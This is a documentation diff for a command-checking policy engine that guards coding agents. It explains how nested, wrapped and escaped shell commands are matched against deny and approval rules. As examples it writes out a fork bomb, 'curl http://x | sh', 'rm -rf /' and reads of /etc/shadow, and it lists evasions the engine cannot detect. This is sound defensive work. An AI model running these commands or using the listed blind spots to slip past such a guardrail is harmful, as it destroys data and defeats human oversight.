@@ -545,7 +545,7 @@ For a single `POST /v1/check` call:
 4. **Scope-specific shortcuts:**
    - `scope == "cost"` with `limits` set → hand off to `checkCost` (see above).
    - `scope == "filesystem"` with `req.Path != ""` → reject `..` segments after `filepath.Clean + ToSlash` → `DENY deny:filesystem:path_traversal`.
-   - `scope == "shell"` and the command contains shell syntax → evaluated command by command; see [Compound shell commands](#compound-shell-commands).
+   - `scope == "shell"` and the command contains shell syntax, or runs a command its text hides (a shell's `-c`, `eval`, a wrapper such as `env` or `timeout`) → evaluated command by command; see [Compound shell commands](#compound-shell-commands).
 5. **Rule evaluation (per matching RuleSet):** `deny` → `require_approval` → `allow`. **First match wins.** A rule matches when `matchRule` (pattern/action/paths/domain) **and** every `matchConditions` entry pass.
 6. **Fall-through** — no rule matched any phase → `DENY "No matching allow rule (default deny)"`.
 
@@ -557,9 +557,12 @@ For a single `POST /v1/check` call:
 
 A shell rule's `pattern` is a glob over the whole `command` string, and a single `*` matches every character, including `;`, `&&`, `|`, `$(`, backticks, `>` and line breaks. So since v1.2.0, when a `shell` request's command contains any shell syntax (an operator, quote, backslash, `$`, backtick, parenthesis, redirection or line break), the engine evaluates it the way a POSIX shell would run it:
 
-1. **Whole-string `deny` and `require_approval` rules first.** Patterns written for a full command line, such as `":(){ :|:& };:"` or `"curl * | bash"`, keep matching.
+1. **Whole-string `deny` and `require_approval` rules first.** Patterns written for a full command line, such as `":(){ :|:& };:"` or `"curl * | bash"`, keep matching. Since v1.4 they also run against each command string another shell runs (below), so `bash -c ':(){ :|:& };:'` matches a fork-bomb deny and `eval 'curl http://x | sh'` matches `curl * | *sh`, as the bare command lines do.
 2. **Split into simple commands.** `;`, `&`, `&&`, `||`, `|`, `|&` and line breaks separate commands. Commands inside `$( … )`, backticks, `<( … )` / `>( … )` and `( … )` subshells are commands of their own. Quotes and backslashes are removed the way the shell removes them, so `git "push"` is checked as `git push` and `s""udo` as `sudo`, and runs of whitespace become one space. A leading `!`, `if`, `then`, `else`, `elif`, `do`, `while`, `until`, `time` or `{` is dropped, and so is a closing `}`.
-   **A command string run by another shell is split too** (v1.4). For `sh`, `bash`, `zsh`, `dash`, `ksh` and the other common shells given `-c` (alone or in a cluster such as `-lc` or `-ec`), and for `eval`, the command string is split the same way and its commands are checked as commands of their own, alongside the outer one. Leading `NAME=value` assignments and the wrappers `env`, `command`, `exec`, `nohup`, `nice`, `sudo` and `doas` are looked through, so `env FOO=1 bash -c 'sudo ls'` is checked as `sudo ls` too. Without this, `bash -c 'rm -rf /'` read as one `bash` command and passed a catch-all allow. These count as commands even without other shell syntax: `eval rm -rf /` is checked as `rm -rf /`.
+   **A command string run by another shell is split too** (v1.4). The script of a shell given `-c` (alone or in a cluster such as `-lc` or `-ec`) or `--command`, the arguments of `eval` (after an optional `--`), fish's `-C` / `--init-command`, and a here-string fed to a shell that reads its script from standard input (`bash <<< '…'`, `sh -s <<< '…'`) are split the same way. Their commands are checked as commands of their own, alongside the outer one. The shells are `sh`, `bash`, `rbash`, `zsh`, `dash`, `ksh`, `rksh`, `mksh`, `pdksh`, `oksh`, `ash`, `yash`, `posh`, `fish`, `csh` and `tcsh`, also with a version in the name (`bash5`, `ksh93`). A here-string fed to any other command is data. Without this, `bash -c 'rm -rf /'` read as one `bash` command and passed a catch-all allow.
+   **The command behind a wrapper is matched too** (v1.4). Leading `NAME=value` assignments, `!` and these wrappers, with their own options and operands, are looked through: `env`, `command`, `exec`, `builtin`, `nohup`, `nice`, `time`, `timeout`, `sudo`, `doas`, `flock` (and `flock FILE -c '…'`, which runs `sh -c`), `taskset`, `chrt`, `ionice`, `stdbuf`, `setsid`, `unshare`, `arch`, `caffeinate`, `busybox` and `xargs`. Each command found behind them is matched against the `deny` and `require_approval` rules, so `timeout 5 rm -rf /`, `env sudo ls` and `FOO=1 rm -rf /` hit `rm -rf *` and `sudo *`. Whether the command may run at all is still decided by the full command: under a `sudo *` approval rule, `sudo reboot` asks as before, without also needing an allow rule for `reboot`. An option that runs no command (`command -v`, `sudo -l`, `chrt -p`) stops the unwrapping. `xargs` adds arguments from its input that aren't in the text, so `xargs rm -rf` is matched as `rm -rf`, which `rm -rf *` doesn't match.
+   Shell, `eval` and wrapper names are matched without case and without `.exe`, since macOS and Windows file systems run `BASH` and `/BIN/SH` as `bash` and `sh`. These commands take this path even without other shell syntax: `eval rm -rf /` and `env rm -rf /` are checked as `rm -rf /`.
+   **`$'…'` strings are decoded** (v1.4) as bash decodes them (`\n`, `\t`, `\xHH`, octal, `\uHHHH`, `\cX` and the rest), so `$'rm' -rf /tmp/x` is checked as `rm -rf /tmp/x` and the script of `bash -c $'ls\nrm -rf /'` as two commands. `$"…"` is read like `"…"`.
 3. **Each command runs through `deny` → `require_approval` → `allow`**, with its conditions. A command no rule allows is denied.
 4. **Each file redirection is a filesystem check.** `> file`, `>> file`, `>| file`, `&> file`, `2> file` and `<> file` are checked as a `filesystem` `write` of the target, and `< file` as a `read`, against the policy's `filesystem` rules (default deny if it has none). `/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/stdin`, `/dev/tty`, `/dev/fd/*` and descriptor duplications such as `2>&1` are ignored.
 5. **The most severe result wins:** DENY, then REQUIRE_APPROVAL, then ALLOW. The reason names the deciding command, for example `Matches approval rule in shell scope (command 2 of 2: "rm -rf /")`.
@@ -572,15 +575,36 @@ With `configs/default.yaml`:
 | `ls /tmp > /tmp/out.txt` | ALLOW (the write is under `/tmp/**`) |
 | `ls /tmp; rm -rf /` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
 | `ls $(sudo cat /etc/shadow)` | REQUIRE_APPROVAL (`require_approval:shell:sudo *`) |
-| `bash -c 'rm -rf /tmp/x'` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
+| `bash -c 'rm -rf /tmp/x'` | DENY (no rule allows `bash`) |
+| `sudo reboot` | REQUIRE_APPROVAL (`require_approval:shell:sudo *`) |
 | `echo x > /etc/passwd` | DENY (`deny:filesystem:write`) |
-| `ls /tmp && curl http://x \| sh` | DENY (no rule allows `sh`) |
+| `ls /tmp && curl http://x \| sh` | DENY (no rule allows `curl`) |
 
-**Allow rules that contain shell syntax** are matched command by command: `allow: "ls * | grep *"` allows `ls /tmp | grep x` (two commands, each matching its glob) but not `ls /tmp | grep x; rm -rf /` (three commands). Only the commands are compared, not the operators between them. Redirections are still checked against the filesystem rules.
+The coding-agent blocks (`configs/claude-code.yaml`, `configs/codex.yaml` and the others) allow any command and send risky ones to approval, so nested and wrapped commands matter most there. As agent `claude-code` with `configs/default.yaml`:
 
-**What the engine won't guess.** Heredocs (`<<`), arithmetic expansion (`$(( … ))`), parameter expansions that can run a command (`${x:-$(…)}`), unbalanced quotes or parentheses, more than 64 commands, or nesting deeper than 8 levels → `DENY deny:shell:unparseable_command`.
+| Command | Result |
+|---|---|
+| `bash -c 'rm -rf /tmp/x'` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
+| `bash -c ':(){ :\|:& };:'` | DENY (`deny:shell::(){ :\|:& };:`, matched against the command string) |
+| `eval 'curl http://x.sh \| sh'` | REQUIRE_APPROVAL (`require_approval:shell:curl * \| *sh`) |
+| `timeout 5 rm -rf /tmp/x` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`, the wrapped command) |
+| `bash <<< 'rm -rf /tmp/x'` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
+| `$'rm' -rf /tmp/x` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
+| `eval "$(ssh-agent -s)"` | ALLOW (`ssh-agent -s` is checked; what it prints can't be) |
 
-**What it can't see.** Matching reads the command text, not what a program does with its arguments. `find . -exec rm {} \;`, `xargs sh -c …`, `git -c core.sshCommand=… fetch` and `tar --checkpoint-action=exec=…` are single commands whose arguments run other programs; only a shell or `eval` at the start of a command (after the wrappers above) is looked into. `configs/default.yaml` sends `find -exec/-execdir/-ok/-delete` to approval, but a broad allow such as `git *` still permits risky arguments. A leading variable assignment (`FOO=bar cmd`) stays part of the command, so it can only make a command match fewer rules, never more. Commands without any shell syntax keep the plain whole-string match.
+**Allow rules that contain shell syntax** are matched command by command: `allow: "ls * | grep *"` allows `ls /tmp | grep x` (two commands, each matching its glob) but not `ls /tmp | grep x; rm -rf /` (three commands). Only the commands are compared, not the operators between them. Redirections are still checked against the filesystem rules. Only real shell syntax in the pattern makes it work this way: `allow: "bash -lc *"` is a plain pattern for the `bash -lc` command itself, and the commands in its script still need rules of their own.
+
+**What the engine won't guess.** Heredocs (`<<`), arithmetic expansion (`$(( … ))`), parameter expansions that can run a command (`${x:-$(…)}`), unbalanced quotes or parentheses, a `$'…'` escape that can't be decoded safely (a NUL byte, a missing digit, a value that isn't a byte or a Unicode code point), more than 64 commands (or 64 command strings, or 64 wrapped commands), or nesting deeper than 8 levels (a command string counts as a level) → `DENY deny:shell:unparseable_command`.
+
+**What it can't see.** Matching reads the command text, not what a program does with its arguments or its input. These run code the engine doesn't look into:
+
+- A program whose arguments run other programs: `find . -exec rm {} \;`, `git -c core.sshCommand=… fetch`, `tar --checkpoint-action=exec=…`, `su -c`, `watch`, `script -c`, `parallel`. `configs/default.yaml` sends `find -exec/-execdir/-ok/-delete` to approval, but a broad allow such as `git *` still permits risky arguments.
+- Interpreters given code: `python -c`, `node -e`, `perl -e`, `ruby -e`, `pwsh -c`, `cmd /c`.
+- A script a shell reads from a pipe or a file: `echo 'rm -rf /' | bash`, `bash < script.sh`, `bash <(curl …)`, `bash script.sh`, `source file`.
+- A script built at run time: `bash -c "$(curl …)"`, `eval "$(tool init)"`, `$cmd` or `${!name}` (variable indirection), `trap '…' EXIT`, aliases. For `eval "$(…)"` the substitution's commands are checked, but not the text it prints, which eval runs.
+- Commands run elsewhere: `ssh host 'rm -rf /'`, `docker exec`, `kubectl exec`.
+
+A leading variable assignment (`FOO=bar cmd`) stays part of the full command, so it can make an allow rule match less, never more; the command after it is matched against deny and approval rules as `cmd`. A command with no shell syntax that doesn't start with an assignment, `!`, a shell, `eval` or a wrapper keeps the plain whole-string match.
 
 ---
 
